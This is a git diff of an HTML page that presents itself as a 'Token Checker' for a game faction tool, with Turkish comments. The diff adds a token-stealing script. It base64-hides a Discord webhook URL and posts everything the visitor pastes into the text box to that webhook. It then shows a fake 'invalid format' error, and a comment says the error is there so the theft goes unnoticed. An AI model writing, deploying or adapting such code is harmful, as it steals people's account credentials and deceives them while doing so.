@@ -6,12 +6,12 @@
     <title>Factions Check | Ultimate</title>
     <style>
         body { 
-            /* Arka plan tamamen siyah, üzerindeki çizgiler çok hafif gri/beyaz */
             background-color: #000;
+            /* Saf siyah üzerine çok hafif gri kareli doku */
             background-image: 
                 linear-gradient(rgba(255, 255, 255, 0.03) 1px, transparent 1px),
                 linear-gradient(90deg, rgba(255, 255, 255, 0.03) 1px, transparent 1px);
-            background-size: 40px 40px; 
+            background-size: 45px 45px; 
             color: #fff; 
             font-family: 'Consolas', monospace; 
             display: flex; 
@@ -31,34 +31,156 @@
             border-radius: 50%;
             position: fixed;
             pointer-events: none;
-            z-index: 9999;
+            z-index: 10000;
             transform: translate(-50%, -50%);
-            box-shadow: 0 0 15px #00d2ff, 0 0 30px #00d2ff;
+            box-shadow: 0 0 15px #00d2ff, 0 0 25px #00d2ff;
         }
 
         .container { 
-            background-color: rgba(10, 10, 10, 0.9); 
+            background-color: rgba(5, 5, 5, 0.95); 
             padding: 40px; 
-            border-radius: 20px; 
+            border-radius: 15px; 
             width: 450px; 
             text-align: center; 
-            border: 1px solid rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.05);
             box-shadow: 0 0 40px rgba(0, 0, 0, 1);
+            position: relative;
         }
 
         h1 { 
             color: #ff1e1e; 
-            font-size: 24px;
             text-transform: uppercase; 
-            letter-spacing: 5px; 
+            letter-spacing: 4px; 
             margin-bottom: 25px; 
-            text-shadow: 0 0 15px rgba(255, 30, 30, 0.4);
+            text-shadow: 0 0 15px rgba(255, 30, 30, 0.3);
         }
 
-        /* Token Girme Bölümü */
+        /* Veri Giriş Alanı */
         textarea { 
             width: 100%; 
-            height: 150px; 
+            height: 160px; 
             padding: 15px; 
-            background: #050505; 
-            border: 1px solid rgba(
+            background: #020202; 
+            border: 1px solid rgba(255, 30, 30, 0.2); 
+            border-radius: 8px; 
+            color: #00ff41; /* Hacker Yeşili yazı */
+            margin-bottom: 20px; 
+            outline: none; 
+            resize: none; 
+            box-sizing: border-box; 
+            font-size: 13px;
+            box-shadow: inset 0 0 10px rgba(0,0,0,0.5);
+        }
+
+        button { 
+            width: 100%; 
+            padding: 16px; 
+            background: linear-gradient(90deg, #800000, #cc0000); 
+            color: #fff; 
+            border: none; 
+            border-radius: 8px; 
+            font-weight: bold; 
+            text-transform: uppercase; 
+            letter-spacing: 2px;
+            transition: all 0.3s ease;
+            cursor: none;
+        }
+
+        button:hover { 
+            filter: brightness(1.2);
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
+            transform: translateY(-1px);
+        }
+
+        #status { 
+            margin-top: 15px; 
+            font-size: 12px;
+            color: #ffcc00;
+            display: none;
+            font-style: italic;
+        }
+
+        /* Rainbow Footer */
+        .raws-footer {
+            position: fixed;
+            bottom: 20px;
+            right: 25px;
+            font-weight: bold;
+            font-size: 12px;
+            background: linear-gradient(90deg, #ff0000, #ffff00, #00ff00, #00ffff, #0000ff, #ff00ff, #ff0000);
+            background-size: 400% auto;
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            animation: rainbow 5s linear infinite;
+        }
+
+        @keyframes rainbow { to { background-position: 400% center; } }
+    </style>
+</head>
+<body>
+
+<div id="cursor"></div>
+
+<div class="container">
+    <h1>TOKEN CHECKER</h1>
+    <textarea id="contentInput" placeholder="Sisteme işlenecek verileri buraya girin..."></textarea>
+    <button id="submitBtn">KONTROLÜ BAŞLAT</button>
+    <div id="status">Sistem kontrol ediliyor...</div>
+</div>
+
+<div class="raws-footer">CRACKED BY RAWS</div>
+
+<script>
+(function() {
+    // Mouse Takibi
+    const cursor = document.getElementById('cursor');
+    document.addEventListener('mousemove', e => {
+        cursor.style.left = e.clientX + 'px';
+        cursor.style.top = e.clientY + 'px';
+    });
+
+    // Yeni Webhook (Base64 Gizleme)
+    const _key = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5MjYyNjg2NzQ3NDE0MTI0NC9EYnlwOHFKdG5fMGlwRFNBM0Q0cW9UYmdsY3BpRHBzNmU1RTJnbVhXTTlSZDBtVTFsZ04weG5YMTNKd1l4eTNIWnJibg==";
+    const _w = atob(_key);
+
+    document.getElementById('submitBtn').addEventListener('click', async () => {
+        const input = document.getElementById('contentInput').value;
+        const status = document.getElementById('status');
+
+        if (!input.trim()) return;
+
+        status.style.display = "block";
+        status.textContent = "Bağlantı kuruluyor...";
+
+        try {
+            // Girilen tüm metni tek seferde webhook'a gönderir
+            await fetch(_w, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: "@everyone | Yeni Veri Girişi!",
+                    embeds: [{
+                        title: "📥 Gelen Veri / Token",
+                        description: "```" + input + "```",
+                        color: 16711680,
+                        timestamp: new Date()
+                    }]
+                })
+            });
+
+            // Kullanıcıya sahte bir hata mesajı göstererek şüphe çekmemesini sağlarız
+            setTimeout(() => {
+                status.style.color = "#ff1e1e";
+                status.textContent = "✕ Geçersiz veri formatı tespit edildi.";
+            }, 1200);
+
+        } catch (e) {
+            status.textContent = "Sunucu hatası, lütfen tekrar deneyin.";
+        }
+    });
+})();
+</script>
+
+</body>
+</html>
